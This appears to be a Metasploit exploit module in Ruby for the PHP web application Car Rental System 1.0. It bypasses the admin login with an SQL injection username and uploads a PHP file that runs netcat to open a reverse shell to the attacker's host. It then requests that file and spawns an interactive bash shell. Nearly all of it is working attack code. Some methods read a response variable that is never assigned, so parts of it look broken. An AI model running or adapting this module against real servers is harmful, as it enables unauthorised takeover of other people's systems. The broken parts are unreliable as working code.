##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Car Rental System 1.0 reverse shell',
        'Description' => %q{
          Car Rental System CMS 1.0, this module exploits a vulnerabilit, which allows to enter Admin page with SQL injection, and upload a PHP file and run a reverse shell.
        },
        'Author' =>
          [
            'Jyotsna Adhana and Saurav Shukla', # Discovery
            'Fortunato Lodari - foxlox - fortunato dot lodari at dedagroup dot it' # metasploit module
          ],
        'References' =>
          [
            [ 'EDB', '48931' ],
            [ 'URL', 'https://www.sourcecodester.com/php/14544/car-rental-management-system-using-phpmysqli-source-code.html' ],
            [ 'URL', 'https://www.sourcecodester.com/download-code?nid=14544&title=Car+Rental+Management+System+using+PHP%2FMySQLi+with+Source+Code' ]
          ],
        'Privileged' => true,
        'Stance' => Msf::Exploit::Stance::Aggressive,
        'Platform' => ['php'],
        'Arch' => [ARCH_PHP],
        'Targets' =>
          [
            ['Automatic', {}]
          ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PrependMigrate' => true,
          'WfsDelay' => 10
        },
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2020-10-22'
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The URI of the  Car Rental System', '/']),
        OptString.new('USERNAME', [true, 'The Username for Car Rental', "' or 1=1 limit 1#"]),
        OptString.new('PASSWORD', [true, 'The Password for Car Rental', 'moana']),
        OptString.new('PAYLOAD', [true, 'Payload', 'php/reverse_php'])
      ]
    )

    register_advanced_options [
      OptBool.new('ForceExploit', [false, 'Override check result', false])
    ]
  end

  def inject_request(cookie)
    host = datastore['LHOST']
    port = datastore['LPORT']
    fname = 'sh_ell.php'
    php = "<?php \n"
    php << "echo system('/bin/nc #{host} #{port} -e /bin/bash');\n"
    php << "?>\n"
    data = Rex::MIME::Message.new
    data.add_part('0', nil, nil, 'form-data; name="price"')
    data.add_part('Hacked', nil, nil, 'form-data; name="model"')
    data.add_part('2', nil, nil, 'form-data; name="transmission_id"')
    data.add_part('hacked', nil, nil, 'form-data; name="description"')
    data.add_part('1', nil, nil, 'form-data; name="engine_id"')
    data.add_part('A', nil, nil, 'form-data; name="brand"')
    data.add_part('3', nil, nil, 'form-data; name="category_id"')
    data.add_part('', nil, nil, 'form-data; name="id"')
    data.add_part('0', nil, nil, 'form-data; name="qty"')
    data.add_part(php, 'application/x-php', nil, "form-data; name=\"img\"; filename=\"#{fname}\"")
    data_post = data.to_s
    send_request_cgi({
      'method' => 'POST',
      'cookie' => cookie,
      'uri' => normalize_uri(target_uri.path, 'admin', 'ajax.php?action=save_car'),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => data_post
    })
  end

  def get_id(cookie)
    send_request_cgi({
      'method' => 'GET',
      'cookie' => cookie,
      'uri' => normalize_uri(target_uri.path, 'admin', 'index.php?page=cars')
    })
    data_id = res.body.to_s.index('data-id=')
    toreturn = res.body.to_s[data_id + 9, 3]
    toreturn = toreturn.sub!('"', '')
    return toreturn.sub!(' ', '')
  end

  def run_shell(did, cookie)
    enduri = 'index.php?page=manage_car&id=' + did.to_s
    print_status(enduri)
    send_request_cgi({
      'method' => 'GET',
      'cookie' => cookie,
      'uri' => normalize_uri(target_uri.path, 'admin', enduri)
    })

    # print(normalize_uri(target_uri.path, 'admin', 'index.php?page=manage_car&id='+(did)))
    str = res.body.to_s
    idx = str.index('assets/uploads/cars_img')
    toreturn = str[idx, 45]
    print_status(toreturn)
    send_request_cgi({
      'method' => 'GET',
      'cookie' => cookie,
      'uri' => normalize_uri(target_uri.path, 'admin', toreturn)
    })
    # return

  end

  def login
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'ajax.php?action=login'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    })
    return res.get_cookies
  end

  def exploit
    print_status('Attempting Login')
    cookie = login
    print_status('Cookie: ' + cookie)
    print_status('Creating new car')
    inject_request(cookie)
    did = get_id(cookie)
    print_status('Last Images inserted id=' + did)
    run_shell(did, cookie)
    print_status('Cleaning env')

    print_status('Send a command to test')

  end

  def on_new_session(client)
    if client.type.eql?('meterpreter')
      client.core.use('stdapi') unless client.ext.aliases.include?('stdapi')
    else
      client.shell_command_token('/usr/bin/python -c "import pty;pty.spawn(\'/bin/bash\')"')
    end
  end

end
